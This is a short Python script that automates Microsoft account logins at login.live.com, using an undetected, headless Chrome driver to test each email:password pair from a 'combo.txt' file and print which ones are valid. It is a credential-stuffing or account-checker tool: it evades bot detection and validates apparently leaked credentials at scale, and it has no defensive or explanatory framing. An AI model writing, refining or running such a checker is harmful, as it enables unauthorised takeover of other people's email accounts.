import time
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By

def outlook_login_check(email, password):
    options = uc.ChromeOptions()
    options.headless = True
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    driver = uc.Chrome(options=options)
    driver.set_page_load_timeout(30)

    try:
        driver.get("https://login.live.com/")
        time.sleep(2)

        driver.find_element(By.NAME, "loginfmt").send_keys(email)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(3)

        if "Enter password" in driver.page_source:
            driver.find_element(By.NAME, "passwd").send_keys(password)
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(4)

            if "Stay signed in?" in driver.page_source or "account.microsoft.com" in driver.current_url:
                print(f"✅ Valid: {email}:{password}")
                return True
            else:
                print(f"❌ Invalid: {email}:{password}")
                return False
        else:
            print(f"⚠️ Email invalid or blocked: {email}")
            return False
    except Exception as e:
        print(f"🚫 Error: {email} -> {e}")
        return False
    finally:
        driver.quit()

# === Test with combos ===
with open("combo.txt") as f:
    for line in f:
        if ":" in line:
            email, pwd = line.strip().split(":", 1)
            outlook_login_check(email, pwd)
